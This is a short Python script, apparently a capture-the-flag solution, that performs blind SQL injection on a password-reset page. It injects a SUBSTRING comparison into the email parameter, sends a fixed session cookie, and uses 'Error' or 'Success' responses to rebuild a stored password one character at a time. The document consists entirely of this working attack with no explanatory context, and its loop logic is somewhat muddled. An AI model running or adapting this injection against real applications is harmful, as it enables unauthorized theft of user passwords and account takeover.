

import requests

URL = "http://www.challenges.com/blind-sqli/reset.php?"
 

enumeration = "abcdefghijklmnopqrstuvwxyz 1234567890"
start = 1
bless = 0

passphrase = ""

for y in range(20):
	if start < y:
		for x in range(30):
			character = enumeration[bless:bless+1]

			change = "flag22@test.com' AND SUBSTRING(password,"

			part2 = str(start) + ",1)='" + str(character)

			PARAMS = {'email':change+part2, 'PHPSESSID':'=r6hjgn5pf6jjd9t0aiqrrm5m16'}

			r = requests.get(url = URL, params = PARAMS)

			#print(URL+change+part2)

			h = r.text
		 			
			if "Error" in h:
				#print("Tried character: " + str(character) + " at pos " + str(start))
				bless = bless + 1
			if "Success" in h:
				print("Success")
				x = 0
				start = start + 1
				bless = 0
				passphrase += str(character)
				print(passphrase)



